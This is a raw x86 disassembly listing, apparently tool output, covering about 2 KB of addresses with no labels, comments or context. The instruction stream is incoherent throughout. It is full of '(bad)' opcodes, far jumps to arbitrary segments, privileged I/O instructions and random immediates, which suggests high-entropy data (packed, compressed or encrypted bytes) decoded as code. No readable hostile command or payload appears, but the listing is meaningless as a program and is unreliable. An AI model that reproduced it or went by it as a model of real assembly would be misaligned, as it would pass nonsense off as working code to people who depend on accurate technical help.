  408b90:	cmp    eax,0xd36e41bd
  408b95:	sub    al,0x5e
  408b97:	test   DWORD PTR [ebx-0x64],ebp
  408b9a:	cmp    al,0xd6
  408b9c:	(bad)  
  408b9d:	fidiv  WORD PTR [edi-0x2c]
  408ba0:	mov    dh,bl
  408ba2:	push   esi
  408ba3:	xchg   BYTE PTR [edi+0x2c],dl
  408ba6:	cmp    ecx,DWORD PTR ds:0x6a2c01c0
  408bac:	aas    
  408bad:	xchg   esi,eax
  408bae:	fs push cs
  408bb0:	or     esp,ebp
  408bb2:	sub    al,0x29
  408bb4:	jecxz  0x408b50
  408bb6:	test   BYTE PTR [ebp-0xb9b63a3],0x43
  408bbd:	mov    edx,0xd98609a9
  408bc2:	imul   esp,DWORD PTR ss:[ebx-0x36648f6a],0x4e845d68
  408bcd:	mov    esp,0x71154a5
  408bd2:	js     0x408bba
  408bd4:	mov    dl,0x42
  408bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bd7:	aad    0x53
  408bd9:	ss std 
  408bdb:	or     eax,0xadd39cb3
  408be0:	fsubr  st,st(7)
  408be2:	jle    0x408c03
  408be4:	add    ebx,ebp
  408be6:	adc    eax,0x6455effe
  408beb:	xor    esi,DWORD PTR [esi-0x3fe48696]
  408bf1:	adc    BYTE PTR ds:0x66263b10,dl
  408bf7:	sbb    edx,DWORD PTR [ebx-0x6c]
  408bfa:	or     al,dh
  408bfc:	adc    esp,DWORD PTR [ebx+0x695319cc]
  408c02:	aam    0xf4
  408c04:	add    BYTE PTR ds:0xa1634926,al
  408c0a:	or     BYTE PTR [ecx],bl
  408c0c:	push   ebx
  408c0d:	imul   esi,DWORD PTR [edi+0x5b],0xd8d311c0
  408c14:	stc    
  408c15:	mov    ebp,0x699631b5
  408c1a:	jns    0x408c37
  408c1c:	js     0x408c7a
  408c1e:	shr    DWORD PTR [ecx+0x1b66c43b],cl
  408c24:	push   ebx
  408c25:	mov    esp,0xa3224f11
  408c2a:	aad    0x6a
  408c2c:	pusha  
  408c2d:	inc    edx
  408c2e:	pop    ebp
  408c2f:	mov    esp,0xf9a7c2e2
  408c34:	pop    ebx
  408c35:	std    
  408c36:	pop    esi
  408c37:	int3   
  408c38:	push   ebx
  408c39:	imul   edi,DWORD PTR [ecx-0x24],0x1b66ee53
  408c40:	rcr    BYTE PTR [ecx+edi*8],0x1d
  408c44:	dec    esi
  408c45:	xchg   esp,eax
  408c46:	jo     0x408c9e
  408c48:	dec    ebx
  408c49:	jmp    0x2ad3642f
  408c4e:	repz sub al,0xe
  408c51:	push   esi
  408c52:	fcom   DWORD PTR gs:[bx+di]
  408c56:	sbb    eax,0xd8e6400b
  408c5b:	or     al,0xd5
  408c5d:	add    al,0xb7
  408c5f:	or     BYTE PTR [esi-0x7d],0x0
  408c63:	xchg   ebp,eax
  408c64:	popa   
  408c65:	pop    ebx
  408c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c67:	les    ebx,FWORD PTR [edx]
  408c69:	sub    al,0x5e
  408c6b:	or     al,BYTE PTR [ecx+ebp*2+0x79]
  408c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c70:	sbb    ah,BYTE PTR [ebx+0x69441b50]
  408c76:	aam    0x7
  408c78:	adc    BYTE PTR [esi-0x13],bh
  408c7b:	cmc    
  408c7c:	jnp    0x408c00
  408c7e:	jmp    0x5b17:0xbf0a67f5
  408c85:	imul   esi,DWORD PTR [edx],0xa285372c
  408c8b:	or     DWORD PTR [ebx+0x6ed1239c],esi
  408c91:	imul   ebp,DWORD PTR [ecx-0x18dfbbe8],0xd33396c1
  408c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c9c:	fcomp  st(2)
  408c9e:	sub    dl,BYTE PTR [esi+0x49]
  408ca1:	push   0x49
  408ca3:	sbb    edx,DWORD PTR [ebx-0x6c]
  408ca6:	jle    0x408c5d
  408ca8:	shr    BYTE PTR [esi],cl
  408caa:	imul   ecx,DWORD PTR fs:[esi+0x53cc7195],0x19
  408cb2:	jns    0x408ccf
  408cb4:	cmp    BYTE PTR [ecx-0x5ea46d02],cl
  408cba:	jns    0x408cd7
  408cbc:	push   ebx
  408cbd:	imul   esp,esi,0x73286fcd
  408cc3:	fist   DWORD PTR [ebx+0xc]
  408cc6:	sti    
  408cc7:	push   esp
  408cc8:	inc    edx
  408cc9:	sbb    edi,DWORD PTR [ecx]
  408ccb:	sbb    DWORD PTR [ebx+0x441da9a1],esp
  408cd1:	imul   edi,edi,0x1e534392
  408cd7:	aad    0x53
  408cd9:	imul   esp,DWORD PTR [esi+ebp*1+0x26],0xda19391c
  408ce1:	fild   QWORD PTR [esi-0x72]
  408ce4:	xchg   ebx,eax
  408ce5:	and    DWORD PTR [esi-0x35],esp
  408ce8:	push   ebx
  408ce9:	imul   esi,DWORD PTR [esi],0x3c21538f
  408cef:	stos   BYTE PTR es:[edi],al
  408cf0:	adc    eax,0x43857804
  408cf5:	mov    ds:0x69441d57,al
  408cfa:	call   DWORD PTR [edx+0x59959f47]
  408d00:	bound  ebp,QWORD PTR [ecx]
  408d02:	data16 cs (bad) 
  408d05:	outs   dx,BYTE PTR ds:[esi]
  408d06:	std    
  408d07:	push   0x4b
  408d09:	add    eax,0x1625cf58
  408d0e:	sub    BYTE PTR [edx],0xd0
  408d11:	bnd jae 0x408cef
  408d14:	push   ebx
  408d15:	push   0xa3002d46
  408d1a:	add    bl,bl
  408d1c:	push   ebx
  408d1d:	push   0x2962fa95
  408d22:	cmp    cx,WORD PTR gs:[eax]
  408d26:	push   0x1b
  408d28:	inc    esp
  408d29:	sub    eax,0x296236e5
  408d2e:	data16 stos BYTE PTR es:[edi],al
  408d30:	into   
  408d31:	sbb    edx,DWORD PTR gs:[bp+di+0x68]
  408d36:	xchg   ebp,eax
  408d37:	xor    ah,BYTE PTR [edx+0x29]
  408d3a:	data16 mov cl,0x93
  408d3d:	and    DWORD PTR [edi],edx
  408d3f:	xchg   DWORD PTR [edi],eax
  408d41:	jmp    0x1a87:0xa2438579
  408d48:	inc    esp
  408d49:	imul   edi,edi,0xb91d3f92
  408d4f:	test   al,0xcf
  408d51:	add    eax,0x9c531b67
  408d56:	outs   dx,BYTE PTR ds:[esi]
  408d57:	bound  ebx,QWORD PTR [ecx+eiz*4+0x69441bec]
  408d5e:	sub    eax,0x391c2e54
  408d63:	sbb    DWORD PTR [esi+eax*4-0x58],edx
  408d67:	(bad)  
  408d68:	push   ebx
  408d69:	imul   ecx,DWORD PTR [ecx],0x6d703b60
  408d6f:	sbb    eax,DWORD PTR [ebp+ebp*1-0x1b]
  408d73:	push   cs
  408d74:	bound  ebp,QWORD PTR [ecx]
  408d76:	data16 stos BYTE PTR es:[edi],al
  408d78:	into   
  408d79:	lea    esp,[esi+0x1b]
  408d7c:	push   ebx
  408d7d:	pushf  
  408d7e:	rcl    ecx,cl
  408d80:	fsubr  st,st(7)
  408d82:	push   edx
  408d83:	inc    ecx
  408d84:	xchg   DWORD PTR [ecx+0x79],ebp
  408d87:	sbb    ecx,DWORD PTR [edx+0x51872e1d]
  408d8d:	adc    al,0x82
  408d8f:	sub    al,0xbe
  408d91:	add    bh,ah
  408d93:	call   0x9750:0xddf8053f
  408d9a:	sub    dh,BYTE PTR [ebx-0x4aff3f28]
  408da0:	fcmovb st,st(1)
  408da2:	add    BYTE PTR [esi],ch
  408da4:	xchg   esi,eax
  408da5:	adc    eax,0x23879065
  408daa:	addr16 mov cx,0x792a
  408daf:	mov    DWORD PTR [ebx-0x442e2c98],esp
  408db5:	jns    0x408ddf
  408db7:	shl    DWORD PTR [ebx+0x68],cl
  408dba:	ror    DWORD PTR [ecx],cl
  408dbc:	cmp    edi,DWORD PTR [ebp+0x6a]
  408dbf:	sbb    eax,DWORD PTR [edx+esi*1-0x3]
  408dc3:	call   0x58d8:0x5d39c5b
  408dca:	gs ins DWORD PTR es:[edi],dx
  408dcc:	xchg   DWORD PTR [edi+edi*1-0x219bf9b],ebx
  408dd3:	jp     0x408e30
  408dd5:	add    al,0xcc
  408dd7:	fst    QWORD PTR [eax+edx*2+0x3d]
  408ddb:	rcl    DWORD PTR [eax+edx*2-0x2b],cl
  408ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de0:	(bad)  
  408de1:	xchg   esi,eax
  408de2:	sbb    BYTE PTR [ebx-0x65022563],ah
  408de8:	pop    ebx
  408de9:	add    al,0xeb
  408deb:	lods   eax,DWORD PTR ds:[esi]
  408dec:	fcomp  st(0)
  408dee:	jle    0x408e1e
  408df0:	nop
  408df1:	sar    DWORD PTR [esi],1
  408df3:	aam    0x1b
  408df5:	adc    dh,BYTE PTR [esi+0x5eac1bf4]
  408dfb:	(bad)  
  408dfc:	sub    BYTE PTR [ecx-0x2727b0ac],0x76
  408e03:	lds    ebx,FWORD PTR cs:[esi]
  408e06:	cld    
  408e07:	sbb    DWORD PTR [edi+0x4],0xffffffd2
  408e0b:	add    eax,0x67eee50
  408e10:	out    dx,eax
  408e11:	xor    ebx,eax
  408e13:	push   esp
  408e14:	or     eax,0x44ec4763
  408e19:	xchg   edi,eax
  408e1a:	push   edx
  408e1b:	mov    al,0xe6
  408e1d:	dec    eax
  408e1e:	fdiv   QWORD PTR [esp+eax*2+0xf305697]
  408e25:	outs   dx,DWORD PTR ds:[esi]
  408e26:	jns    0x408e43
  408e28:	fcomp  DWORD PTR [ebp+0x695319e2]
  408e2e:	inc    esp
  408e2f:	(bad)  
  408e30:	fmul   st,st(5)
  408e32:	out    0x19,al
  408e34:	push   ebx
  408e35:	imul   esp,DWORD PTR [esp+edi*2+0x5b],0x58add59c
  408e3d:	pop    ss
  408e3e:	sar    BYTE PTR [eax+edx*2-0x6a],cl
  408e42:	jle    0x408ea9
  408e44:	cmp    edx,DWORD PTR [ebx+0x1d441b6d]
  408e4a:	mov    ecx,0xde376182
  408e4f:	sub    al,BYTE PTR [esi]
  408e51:	lods   al,BYTE PTR ds:[esi]
  408e52:	cmp    BYTE PTR [eax],bl
  408e54:	mov    esi,0x472951ba
  408e59:	imul   edi,DWORD PTR [ecx-0x51],0x2c219713
  408e60:	and    ebx,DWORD PTR [esi-0x2a275613]
  408e66:	jge    0x408e6d
  408e68:	mov    esi,0x5000fc04
  408e6d:	xchg   esi,eax
  408e6e:	jle    0x408e46
  408e70:	mov    BYTE PTR [edx],0x9a
  408e73:	lods   al,BYTE PTR ds:[esi]
  408e74:	adc    edx,DWORD PTR [edi-0x44f655e7]
  408e7a:	sbb    BYTE PTR [ecx-0x2eddfbb2],cl
  408e80:	xchg   ebx,eax
  408e81:	sub    DWORD PTR [ecx+ebp*2],esi
  408e84:	mov    eax,ds:0xc7bb7921
  408e89:	inc    ebx
  408e8a:	jns    0x408e11
  408e8c:	inc    ebx
  408e8d:	mov    ds:0x69441dcf,al
  408e92:	int3   
  408e93:	dec    esp
  408e94:	cmp    BYTE PTR [esi-0x43a0eb1c],cl
  408e9a:	fwait
  408e9b:	sub    al,0x9e
  408e9d:	add    esp,edi
  408e9f:	jp     0x408efc
  408ea1:	add    al,0xcc
  408ea3:	fnstsw WORD PTR [eax+0x34]
  408ea6:	adc    al,BYTE PTR [edi+0x414927a3]
  408eac:	mov    al,0x77
  408eae:	jns    0x408e39
  408eb0:	fwait
  408eb1:	test   BYTE PTR [ebp+0x79695375],ch
  408eb7:	sbb    edi,DWORD PTR [edi+0x5b82fd29]
  408ebd:	add    al,0x94
  408ebf:	cmp    DWORD PTR [ebx+0x69],edx
  408ec2:	jns    0x408ef2
  408ec4:	test   DWORD PTR [edx+ebp*8],eax
  408ec7:	rcr    eax,1
  408ec9:	fsub   DWORD PTR [edx+0x56]
  408ecc:	cmp    al,BYTE PTR [edx]
  408ece:	mov    dh,0xe
  408ed0:	xor    BYTE PTR [edx-0x66],ah
  408ed3:	dec    edx
  408ed4:	lods   eax,DWORD PTR ds:[esi]
  408ed5:	(bad)  
  408ed6:	ror    BYTE PTR [esi+0x53],1
  408ed9:	jns    0x408eb0
  408edb:	shr    DWORD PTR [esi+0x68],1
  408ede:	dec    ecx
  408edf:	sbb    edx,DWORD PTR [ebx+0x6a]
  408ee2:	jne    0x408ea7
  408ee4:	xor    DWORD PTR [ecx+0x45b92fc],edi
  408eea:	in     al,0x39
  408eec:	push   ebx
  408eed:	imul   edi,DWORD PTR [ecx-0x2a],0x1b66e6d0
  408ef4:	push   ebx
  408ef5:	sub    al,0x56
  408ef7:	xchg   BYTE PTR [ecx],bl
  408ef9:	sahf   
  408efa:	std    
  408efb:	adc    eax,0x36796953
  408f00:	pop    ebx
  408f01:	push   0x6e3bd1d3
  408f06:	ins    DWORD PTR es:[edi],dx
  408f07:	sbb    eax,DWORD PTR [esi+eiz*1-0x79]
  408f0b:	leave  
  408f0c:	push   ebx
  408f0d:	imul   edi,DWORD PTR [ecx+0x2e],0xd9fc1d93
  408f14:	push   edi
  408f15:	pushf  
  408f16:	mov    eax,ds:0xc07e37d8
  408f1c:	mov    ds:0xd8aed571,eax
  408f21:	push   0x2e
  408f23:	xchg   ecx,eax
  408f24:	imul   edx,DWORD PTR [esi-0x638bf0ae],0x3d
  408f2b:	icebp  
  408f2c:	push   eax
  408f2d:	fidivr WORD PTR [esi+0x50]
  408f30:	fwait
  408f31:	dec    ebp
  408f32:	(bad)  
  408f33:	push   0x4f
  408f35:	inc    eax
  408f36:	es mov ecx,0x1b796952
  408f3c:	lods   eax,DWORD PTR ds:[esi]
  408f3d:	adc    BYTE PTR ds:0xd24953a3,ah
  408f43:	ror    BYTE PTR [eax+ecx*8],1
  408f46:	jbe    0x408f63
  408f48:	push   ebx
  408f49:	imul   edi,DWORD PTR [ecx+0x12],0x1b0d658f
  408f50:	push   ebx
  408f51:	imul   edi,DWORD PTR [ecx+0x78],0x1b62451a
  408f58:	mov    ecx,0xdcedd16a
  408f5d:	sbb    al,BYTE PTR [edx]
  408f5f:	sbb    bh,BYTE PTR [esi+0x485551ba]
  408f65:	imul   edi,DWORD PTR [ecx+0x6d],0xc1f6338b
  408f6c:	push   eax
  408f6d:	daa    
  408f6e:	xlat   BYTE PTR fs:[ebx]
  408f70:	pop    edx
  408f71:	cmp    bh,BYTE PTR [ecx+0x59]
  408f74:	or     eax,DWORD PTR [ebp-0x9]
  408f77:	(bad)  
  408f78:	xchg   ebx,eax
  408f79:	stos   DWORD PTR es:[edi],eax
  408f7a:	jb     0x408f92
  408f7c:	pop    ebx
  408f7d:	push   0x7b
  408f7f:	rcl    DWORD PTR [ebp+0x48],cl
  408f82:	scas   eax,DWORD PTR es:[edi]
  408f83:	popf   
  408f84:	push   edx
  408f85:	push   ebp
  408f86:	jg     0x408f74
  408f88:	jb     0x408fdb
  408f8a:	push   ebx
  408f8b:	ins    BYTE PTR es:[edi],dx
  408f8c:	rcr    DWORD PTR [esi*1+0x695bab1],cl
  408f93:	mov    esp,DWORD PTR [edi+0x3b]
  408f96:	sub    DWORD PTR [eax-0x5424f3ec],esi
  408f9c:	mov    al,0x9f
  408f9e:	sub    bl,bl
  408fa0:	in     al,0x96
  408fa2:	mov    DWORD PTR [edi-0x7d67f752],esi
  408fa8:	add    al,0x7b
  408faa:	(bad)  
  408fac:	(bad)  
  408fad:	fdiv   DWORD PTR ds:0x2801b61d
  408fb3:	mov    ch,0xae
  408fb5:	jg     0x409031
  408fb7:	test   eax,0x95816559
  408fbc:	leave  
  408fbd:	pop    ecx
  408fbe:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408fc0:	aad    0x28
  408fc2:	call   0x633bb648
  408fc7:	hlt    
  408fc8:	sub    ch,0x50
  408fcb:	fs jno 0x408fcf
  408fce:	mov    bh,0x1
  408fd0:	add    al,0x81
  408fd2:	jmp    0x2bd9:0x36768fe4
  408fd9:	cs inc al
  408fdc:	sbb    eax,0x5bd06d23
  408fe1:	repz pop ebp
  408fe3:	shr    BYTE PTR [ebp+edx*8-0x11],0x14
  408fe8:	call   0xdc99:0x11ab49f8
  408fef:	das    
  408ff0:	cmp    DWORD PTR [ecx-0x68],0xffffffe0
  408ff4:	pop    esi
  408ff5:	xchg   edx,eax
  408ff6:	jle    0x408fd5
  408ff8:	xor    DWORD PTR [eax+edi*1+0x29],ecx
  408ffc:	lods   al,BYTE PTR cs:[esi]
  408ffe:	aaa    
  408fff:	mov    ?,WORD PTR [eax-0x4686dddf]
  409005:	pop    esi
  409006:	jbe    0x409073
  409008:	mov    ds,WORD PTR [ebx]
  40900a:	cmp    eax,0xc30352d6
  40900f:	imul   edx,DWORD PTR [esi+0x33a5ced8],0xffffff8b
  409016:	rcl    BYTE PTR [bp+si+0x1c],0x17
  40901b:	shl    DWORD PTR [ecx-0x75],1
  40901e:	xor    DWORD PTR [ebx-0x5a6eff31],edi
  409024:	nop
  409025:	scas   al,BYTE PTR es:[edi]
  409026:	mov    ebp,DWORD PTR [ebx+eiz*2+0x6dd4051a]
  40902d:	inc    ecx
  40902e:	jp     0x408fd7
  409030:	push   ecx
  409031:	pop    ds
  409032:	xor    ch,BYTE PTR [edx-0x48108ef]
  409038:	add    ecx,0x7a
  40903b:	fs or  al,0x1d
  40903e:	imul   edi,DWORD PTR [esp+eax*4+0x29],0xffffffde
  409043:	push   esi
  409044:	mov    al,ds:0x16d1ded1
  409049:	sbb    cl,BYTE PTR [eax-0x65]
  40904c:	mov    bh,0xde
  40904e:	(bad)  
  40904f:	jle    0x409033
  409051:	or     DWORD PTR [eax+0x5b],0x58
  409055:	push   es
  409056:	xor    bl,al
  409058:	je     0x409024
  40905a:	adc    eax,0xe27193bb
  40905f:	fist   WORD PTR [edx-0x37]
  409062:	push   0xee94ae87
  409067:	ss (bad) 
  409069:	stc    
  40906a:	jge    0x4090cf
  40906c:	loop   0x40908e
  40906e:	xor    eax,0x76db0bd5
  409073:	xchg   esi,eax
  409074:	outs   dx,DWORD PTR ds:[esi]
  409075:	jnp    0x4090ac
  409077:	scas   eax,DWORD PTR es:[edi]
  409078:	das    
  409079:	dec    ebx
  40907a:	leave  
  40907b:	lods   al,BYTE PTR ds:[esi]
  40907c:	jne    0x4090b9
  40907e:	aad    0x35
  409080:	mov    al,0xca
  409082:	jnp    0x4090ff
  409084:	stos   BYTE PTR es:[edi],al
  409085:	in     eax,0xa7
  409087:	bound  esp,QWORD PTR [bp+di]
  40908a:	bound  edi,QWORD PTR [esi-0x4b9a9e6f]
  409090:	mov    bh,0x39
  409092:	lds    edi,FWORD PTR [esi]
  409094:	pop    edi
  409095:	jne    0x40902c
  409097:	neg    DWORD PTR [ebx-0x53]
  40909a:	xchg   ebp,eax
  40909b:	icebp  
  40909c:	mov    ch,0x2a
  40909e:	jecxz  0x409042
  4090a0:	push   edx
  4090a1:	jecxz  0x4090fd
  4090a3:	dec    edi
  4090a4:	fistp  QWORD PTR [edx-0x39ec8b0b]
  4090ab:	iret   
  4090ac:	icebp  
  4090ad:	mov    ebp,ss
  4090af:	sbb    DWORD PTR [esi],eax
  4090b1:	ficom  DWORD PTR ds:0x2b2c78a9
  4090b7:	or     BYTE PTR [ebx+0x56],dl
  4090ba:	hlt    
  4090bb:	rcr    DWORD PTR [edx+0xfc5732],cl
  4090c1:	sub    DWORD PTR [ebp-0x6e],esi
  4090c4:	shl    DWORD PTR [ebx+0x3a912f41],cl
  4090ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090cb:	pop    ds
  4090cc:	push   ebx
  4090cd:	fadd   DWORD PTR [ecx+0x39b7247b]
  4090d3:	mov    ah,0xb6
  4090d5:	push   0x44
  4090d7:	pop    edi
  4090d8:	and    ch,BYTE PTR [eax+0x24]
  4090db:	scas   al,BYTE PTR es:[edi]
  4090dc:	fucomi st,st(2)
  4090de:	jno    0x409082
  4090e0:	inc    esi
  4090e1:	dec    edx
  4090e2:	cs shl ebx,0x4
  4090e6:	cmp    eax,0x8d6b2b90
  4090eb:	loopne 0x409081
  4090ed:	das    
  4090ee:	xchg   ebp,eax
  4090ef:	add    edi,DWORD PTR [edi]
  4090f1:	jae    0x409163
  4090f3:	mov    ds:0x8837ba95,al
  4090f8:	and    esp,DWORD PTR [edx+0x5433a49]
  4090fe:	lahf   
  4090ff:	fcomip st,st(6)
  409101:	xchg   DWORD PTR ds:0x53ba031d,edi
  409107:	stc    
  409108:	push   ebx
  409109:	lock dec edx
  40910b:	cmp    eax,ebp
  40910d:	popa   
  40910e:	aaa    
  40910f:	ret    0x694f
  409112:	cmp    DWORD PTR [edx],eax
  409114:	ins    DWORD PTR es:[edi],dx
  409115:	and    eax,0xd2c608ab
  40911a:	gs fs cld 
  40911d:	push   ss
  40911e:	jmp    0xf1b4:0x73816b66
  409125:	push   0xffffffff
  409127:	cmc    
  409128:	jo     0x4090c5
  40912a:	inc    edx
  40912b:	aas    
  40912c:	mov    cl,0xec
  40912e:	sbb    BYTE PTR [eax+0x62e6f230],ah
  409134:	jecxz  0x409133
  409136:	push   esp
  409137:	cmp    eax,0xf3c36ac1
  40913c:	popf   
  40913d:	iret   
  40913e:	loop   0x409162
  409140:	mov    WORD PTR [edx+0x287f0066],es
  409146:	push   es
  409147:	and    DWORD PTR [ebp+0x401b747e],edi
  40914d:	mov    cl,0x12
  40914f:	int    0x69
  409151:	mov    DWORD PTR [esi+ebx*1],0xeebc3154
  409158:	adc    al,0xeb
  40915a:	pushf  
  40915b:	jmp    0x409194
  40915d:	mov    bh,0x15
  40915f:	sbb    esp,DWORD PTR [edi-0x7945586b]
  409165:	inc    ebp
  409166:	sbb    eax,0x92215370
  40916b:	xor    esi,edx
  40916d:	and    BYTE PTR [ebx-0x22968f20],0xc9
  409174:	in     al,dx
  409175:	loop   0x409146
  409177:	je     0x4091a5
  409179:	mul    BYTE PTR [edi+0xc]
  40917c:	add    ecx,DWORD PTR [edx]
  40917e:	jne    0x4091ae
  409180:	js     0x409110
  409182:	test   eax,0xbe6abcfe
  409187:	imul   ecx,DWORD PTR [ecx],0xb013679c
  40918d:	leave  
  40918e:	push   di
  409190:	push   esi
  409191:	cmp    al,0x54
  409193:	aad    0x71
  409195:	cmp    BYTE PTR [edx-0x45],dl
  409198:	jmp    0x2b19b25a
  40919d:	sub    al,0x5f
  40919f:	push   eax
  4091a0:	cmp    ebx,DWORD PTR [esi+0x66]
  4091a3:	dec    edi
  4091a4:	fs jmp 0x636db372
  4091aa:	jecxz  0x4091c5
  4091ac:	daa    
  4091ad:	shl    BYTE PTR [eax],1
  4091af:	xchg   BYTE PTR ds:0x858c90ad,dl
  4091b5:	std    
  4091b6:	mov    esp,0x69887656
  4091bb:	out    0x6e,eax
  4091bd:	inc    ebp
  4091be:	inc    edx
  4091bf:	or     ch,cl
  4091c1:	push   0x6b
  4091c3:	or     edi,DWORD PTR [esi-0x8]
  4091c6:	jne    0x4091e0
  4091c8:	cmp    DWORD PTR [esp+eiz*2],eax
  4091cb:	pop    ebx
  4091cc:	out    dx,al
  4091cd:	test   al,0xa7
  4091cf:	xor    dh,bl
  4091d1:	jmp    0x1938:0x6f17cfbc
  4091d8:	mov    esp,0x964f4cc3
  4091dd:	rcr    bl,1
  4091df:	pop    eax
  4091e0:	push   ebx
  4091e1:	scas   eax,DWORD PTR es:[edi]
  4091e2:	mov    ah,0xfb
  4091e4:	fidiv  WORD PTR [edi+0x6a4ad6d9]
  4091ea:	(bad)  
  4091eb:	push   ss
  4091ec:	adc    edi,ebx
  4091ee:	fbstp  TBYTE PTR [edx-0x69]
  4091f1:	and    eax,0x8e8ce166
  4091f6:	jno    0x40925d
  4091f8:	cmp    eax,0xc01b7024
  4091fd:	mov    cs,ecx
  4091ff:	xchg   ebp,eax
  409200:	xor    BYTE PTR ds:0x35530c57,dl
  409206:	loopne 0x4091f2
  409208:	pop    es
  409209:	cld    
  40920a:	mov    dh,0x80
  40920c:	arpl   WORD PTR [ecx+0x73],bp
  40920f:	sub    al,0x20
  409211:	push   ebx
  409212:	inc    esi
  409213:	(bad)  
  409214:	out    0xdd,al
  409216:	dec    ecx
  409217:	xchg   edi,eax
  409218:	adc    DWORD PTR [esi-0x5b41a615],edi
  40921e:	inc    esp
  40921f:	pusha  
  409220:	or     eax,0x74ca5896
  409225:	sahf   
  409226:	dec    ebp
  409227:	fst    st(3)
  409229:	dec    DWORD PTR [esi+0x20]
  40922c:	jmp    0x6473b467
  409231:	mov    ebp,0x609328d5
  409236:	shr    DWORD PTR [esi-0x18],1
  409239:	pop    edx
  40923a:	std    
  40923b:	(bad)  
  40923c:	xchg   esp,eax
  40923d:	adc    DWORD PTR [eax-0x33d7797f],esp
  409243:	xor    eax,0x337121f3
  409248:	xor    eax,0x92d3eb34
  40924d:	fcmovbe st,st(2)
  40924f:	aaa    
  409250:	inc    ebx
  409251:	int    0x4b
  409253:	fstp   DWORD PTR [edi-0x32]
  409256:	pop    ebx
  409257:	push   es
  409258:	cmc    
  409259:	fldcw  WORD PTR [ebx-0x68]
  40925c:	out    0x15,eax
  40925e:	ss leave 
  409260:	sub    ah,BYTE PTR [edi-0x428be644]
  409266:	mov    ds,WORD PTR [eax]
  409268:	sub    eax,0x5341b2ee
  40926d:	add    al,0x27
  40926f:	out    dx,eax
  409270:	lds    ebx,FWORD PTR [ebx+0x3f]
  409273:	adc    al,0xcf
  409275:	sbb    BYTE PTR [eax-0x787de9d9],dh
  40927b:	mov    esi,0x119c25a7
  409280:	inc    edx
  409281:	loop   0x40927c
  409283:	inc    edi
  409284:	push   eax
  409285:	out    dx,eax
  409286:	in     eax,0x1b
  409288:	cmp    DWORD PTR [ebx+ecx*8-0x7afb12c7],eax
  40928f:	int    0xab
  409291:	xchg   esi,eax
  409292:	sar    DWORD PTR [eax-0x4f3f94e2],cl
  409298:	push   0x5345d34f
  40929d:	or     ah,ch
  40929f:	jp     0x409298
  4092a1:	mov    BYTE PTR [esi],bl
  4092a3:	pop    edi
  4092a4:	sbb    al,0x6b
  4092a6:	data16 rcr BYTE PTR ds:0xb4bc39b9,0x76
  4092ae:	jnp    0x409297
  4092b0:	inc    ebp
  4092b1:	jle    0x4092e6
  4092b3:	jns    0x409331
  4092b5:	pop    ds
  4092b6:	jno    0x4092f5
  4092b8:	jmp    0xd4367427
  4092bd:	add    al,0xb
  4092bf:	in     eax,dx
  4092c0:	sbb    eax,0x1ea46687
  4092c5:	push   cs
  4092c6:	pushf  
  4092c7:	shl    BYTE PTR [ecx+0x58],0x71
  4092cb:	ret    
  4092cc:	leave  
  4092cd:	mov    esp,0xe771479
  4092d2:	test   DWORD PTR [ebx+0x2271346c],edi
  4092d8:	(bad)  
  4092d9:	pop    edx
  4092da:	sub    al,0x98
  4092dc:	adc    edx,DWORD PTR ds:0xbcde4745
  4092e2:	push   es
  4092e3:	add    DWORD PTR [ebx+0x6a],eax
  4092e6:	dec    edi
  4092e7:	das    
  4092e8:	ss mov ebx,ecx
  4092eb:	sbb    BYTE PTR ds:0x7d23b8a,bl
  4092f1:	dec    edx
  4092f2:	mov    eax,ds:0x2c0b539a
  4092f7:	lds    ebx,FWORD PTR [edx+0x53]
  4092fa:	repz mov eax,0x59ffb5fe
  409300:	sub    dh,BYTE PTR [edx-0x5c574326]
  409306:	jns    0x4092b2
  409308:	das    
  409309:	(bad)  
  40930a:	mov    ecx,0xf68b27f2
  40930f:	sbb    DWORD PTR [eax],edx
  409311:	inc    ebx
  409312:	es xchg esi,eax
  409314:	and    BYTE PTR [ebx+0x48eb7dd4],ch
  40931a:	jns    0x40938c
  40931c:	or     ebp,edi
  40931e:	push   0x1f
  409320:	jb     0x409319
  409322:	pop    eax
  409323:	clc    
  409324:	mov    esp,0x5af5e46a
  409329:	mov    ds:0x55edcc22,al
  40932e:	and    cx,WORD PTR [eax]
  409331:	lock adc DWORD PTR [edx],esp
  409334:	push   ss
  409335:	cmp    ch,BYTE PTR [esi+0x43954019]
  40933b:	xor    DWORD PTR [ebp+0x53033439],ecx
  409341:	and    eax,0x4481844f
  409346:	sbb    edi,DWORD PTR [ebx-0x6b]
  409349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40934a:	hlt    
  40934b:	aam    0x46
  40934d:	outs   dx,BYTE PTR ds:[esi]
  40934e:	scas   eax,DWORD PTR es:[edi]
  40934f:	pop    ebp
  409350:	pop    esi
  409351:	push   ebp
  409352:	inc    edi
  409353:	cmp    ch,BYTE PTR [edx]
  409355:	sub    ebx,DWORD PTR [edi+0x797ab96f]
  40935b:	mov    DWORD PTR [edi-0x31bd683f],edx
  409361:	and    eax,0xab77d6a7
  409366:	test   BYTE PTR [esp+edx*2-0x70ee78da],0xd
  40936e:	push   edx
  40936f:	fadd   st,st(4)
  409371:	xchg   ecx,eax
  409372:	data16 fmulp st(4),st
  409375:	dec    edx
  409376:	dec    ebx
  409377:	inc    eax
  409378:	adc    ecx,edi
  40937a:	push   cs
  40937b:	shl    bl,cl
  40937d:	ds mov dl,0xb
  409380:	enter  0x6985,0x84
  409384:	add    edx,DWORD PTR [ecx]
  409386:	jle    0x4093e9
  409388:	push   esp
  409389:	push   ss
  40938a:	jge    0x409352
  40938c:	inc    ebx
  40938d:	in     eax,0x75
  40938f:	adc    esi,esi
  409391:	push   edx
  409392:	addr16 jnp 0x40938e
  409395:	push   0x21
  409397:	scas   eax,DWORD PTR es:[edi]
  409398:	ins    BYTE PTR es:[edi],dx
  409399:	mov    al,ds:0xe5d8a865
  40939e:	popaw  
  4093a0:	popf   
  4093a1:	test   al,0x33
  4093a3:	sub    DWORD PTR [ebp+0x56],ebp
  4093a6:	mov    edi,0x5e12ebd4
  4093ab:	(bad)  
  4093ac:	out    0xe,al
  4093ae:	mov    esi,0xd7b4c494
  4093b3:	(bad)  
  4093b4:	push   ebx
  4093b5:	jo     0x409351
